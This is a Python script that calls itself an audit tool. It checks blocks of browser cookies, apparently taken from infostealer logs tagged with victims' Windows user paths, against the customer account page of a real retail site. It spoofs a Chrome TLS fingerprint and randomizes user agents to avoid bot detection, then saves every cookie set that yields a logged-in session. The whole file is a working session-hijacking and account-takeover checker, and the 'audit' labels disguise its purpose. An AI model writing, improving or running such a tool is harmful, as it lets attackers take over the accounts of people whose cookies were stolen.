import os
import tempfile
from http.cookiejar import MozillaCookieJar
from fake_useragent import UserAgent

# Use curl_cffi as a drop-in replacement for requests to enable TLS/HTTP2 spoofing
from curl_cffi import requests

# --- AUDIT TARGET CONFIGURATION ---
COOKIE_FILE_PATH = "cookies.txt"  # Your main log file containing combined segments
TARGET_URL = "https://www.loaded.com/customer/account/"
VALIDATION_STRING = '"text-lg leading-tight">'
OUTPUT_SUCCESS_LOG = "valid_cookies.txt"  # Output target for compliant entries

def get_dynamic_headers():
    """Generates standard browser request headers with a randomized User-Agent."""
    try:
        ua = UserAgent()
        random_ua = ua.random
    except Exception:
        random_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
    return {
        "User-Agent": random_ua,
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded"
    }

def normalize_cookie_lines(raw_lines):
    """Cleans a block of raw lines into standard Netscape format strings for Python."""
    clean_lines = ["# Netscape HTTP Cookie File\n"]
    for line in raw_lines:
        parts = line.strip().split("\t")
        if len(parts) >= 7:
            domain = parts[0]
            subdomain_flag = parts[1]
            # Fix strict domain-to-subdomain verification blocks inside cookiejar
            if domain.startswith(".") and subdomain_flag.upper() == "FALSE":
                parts[1] = "TRUE"
            clean_lines.append("\t".join(parts) + "\n")
    return clean_lines

def test_cookie_block(session_obj, raw_lines, url, validation_str):
    """Validates a cookie segment using a temporary cookiejar pool wrapper."""
    session_obj.cookies.clear()
    clean_data = normalize_cookie_lines(raw_lines)
    
    with tempfile.NamedTemporaryFile(mode="w+", delete=False, encoding="utf-8") as temp_file:
        temp_file.writelines(clean_data)
        temp_file_path = temp_file.name

    try:
        cookie_jar = MozillaCookieJar(temp_file_path)
        cookie_jar.load(ignore_discard=True, ignore_expires=True)
        
        # Merge the parsed cookie jar into the curl_cffi session context
        session_obj.cookies.update(cookie_jar)
        
        # Execute the request. The session inherits the TLS profile of a real browser.
        response = session_obj.get(url, headers=get_dynamic_headers(), timeout=15)
        
        # Evaluate if response metrics indicate an active authorized state
        return response.status_code == 200 and validation_str in response.text
    except Exception as e:
        print(f"    [!] Request anomaly detected: {e}")
        return False
    finally:
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)

def process_combined_log_file(file_path, session_obj, url, validation_str, output_log):
    """Slices the main logging database, isolates file headers, and reviews chunks."""
    if not os.path.exists(file_path):
        print(f"[-] Error: Combined logging file '{file_path}' not found.")
        return

    current_path_header = "Unknown_Audit_Group"
    current_cookie_lines = []
    total_processed = 0
    valid_count = 0

    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            stripped = line.strip()
            if not stripped:
                continue

            # Detect raw directory path markers (e.g., C:\Users\...)
            if stripped.startswith("C:\\") or "@" in stripped:
                if current_cookie_lines:
                    total_processed += 1
                    print(f"[*] Auditing log cluster {total_processed}...")
                    if test_cookie_block(session_obj, current_cookie_lines, url, validation_str):
                        valid_count += 1
                        print("[+] Cluster is VALID! Saving block to log...")
                        with open(output_log, "a", encoding="utf-8") as out:
                            out.write(f"\n{current_path_header}\n\n")
                            out.writelines(current_cookie_lines)
                    else:
                        print("[-] Cluster did not pass validation parameters.")
                
                current_path_header = stripped
                current_cookie_lines = []
                continue

            if len(stripped.split("\t")) >= 7:
                current_cookie_lines.append(line)

        # Process the remaining cluster block sitting in memory at file termination
        if current_cookie_lines:
            total_processed += 1
            print(f"[*] Auditing final log cluster {total_processed}...")
            if test_cookie_block(session_obj, current_cookie_lines, url, validation_str):
                valid_count += 1
                with open(output_log, "a", encoding="utf-8") as out:
                    out.write(f"\n{current_path_header}\n\n")
                    out.writelines(current_cookie_lines)
                print("[+] Cluster is VALID! Saved.")
            else:
                print("[-] Cluster did not pass validation parameters.")

    print(f"\n[*] Audit complete. Analyzed {total_processed} data blocks. Saved {valid_count} verified entries to {output_log}")

if __name__ == "__main__":
    # Initialize the upgraded session. The 'impersonate' argument forces the network
    # socket layer to build a real desktop Chrome browser signature (JA3/HTTP2 specs) [1.2].
    http_session_pool = requests.Session(impersonate="chrome120")
    print("[*] Persistent Advanced-TLS Audit Connection Pool established.")
    
    process_combined_log_file(
        file_path=COOKIE_FILE_PATH,
        session_obj=http_session_pool,
        url=TARGET_URL,
        validation_str=VALIDATION_STRING,
        output_log=OUTPUT_SUCCESS_LOG
    )
    
    http_session_pool.close()
